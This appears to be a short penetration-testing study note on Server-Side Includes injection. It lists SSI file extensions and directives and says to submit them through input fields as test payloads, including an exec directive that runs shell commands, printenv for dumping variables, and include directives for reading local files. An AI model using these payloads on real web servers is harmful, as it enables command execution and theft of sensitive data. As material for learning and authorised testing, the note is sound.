# Server-Sides Includes

The use of SSI in a web application can be identified by checking for extensions
such as:
		- .shtml
		- .shtm
		- .stm




See the following example:

```
// Date
<!--#echo var="DATE_LOCAL" -->

// Modification data of a file
<!-- #flastmod file="index.html" -->

// CGI Program results
<!--#include virtual="/cgi-bin/counter.pl" -->

// Including a footer
<!--#include virtual="/footer.html" -->

// Executing commands
<!--#exec cmd="ls" -->

// Setting variables
<!--#set var="name" value="Rich" -->

// Including virtual files (same directory)
<!--#include virtual="file_to_include.html" -->

// Including files (same directory)
<!--#include file="file_to_include.html" -->

// Print all variables
<!--#printenv -->
```



That said, non-default server configurations exist that could allow other extensions
(such .html) to process SSI directives.

We need to submit payloads to the target application, such as the ones mentioned
above, through input fields to test sor SSI injection. The web server will parse and
execute the directives before rendeering the page if a vulnerability is present,
bu be aware tath those vulnearbilities can exist in blind format too. Successful SSI 
injection can lead for extracting sensitive information form local files or even 
executing commands on the target web server.
